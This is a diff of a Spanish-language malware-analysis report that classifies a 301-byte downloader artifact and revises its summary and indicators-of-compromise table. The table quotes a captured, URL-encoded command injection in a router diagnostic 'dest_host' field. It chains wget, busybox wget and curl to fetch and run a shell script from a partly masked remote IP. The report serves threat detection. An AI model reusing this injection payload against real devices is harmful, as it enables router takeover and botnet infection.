@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with very long lines (301), with no line terminators de 301 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:51:31+00:00`
+- **Registrado:** `2026-08-09T19:51:31.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -51,10 +52,10 @@ XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=%60cd%20/tmp%3Brm%20-
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 91.92.40.XXX | static_analysis |
 | url | hxxp://91.92.40.XXX/wget.sh%20-O%20.s%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O%20.s%3Bcurl%20-o%20.s%20http://91.92.40.XXX/wget.sh%3Bchmod%20777%20.s%3Bsh%20.s%20rep.gpon%3Brm%20-f%20.s%60&ipv=0 | strings |
-| hash | d6f4a35a9605010a5904d2c37e9976c35edf788b9121f1ae8c4fb12d196d39f5 | static_analysis |
+| ip | 91.92.40.XXX | static_analysis |
 | command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=%60cd%20/tmp%3Brm%20-f%20.s%3Bwget%20http://91.92.40.XXX/wget | strings |
+| hash | d6f4a35a9605010a5904d2c37e9976c35edf788b9121f1ae8c4fb12d196d39f5 | static_analysis |
 | ip | 45.153.34.XXX | artifact_source |
 
 ## 🔎 Triage
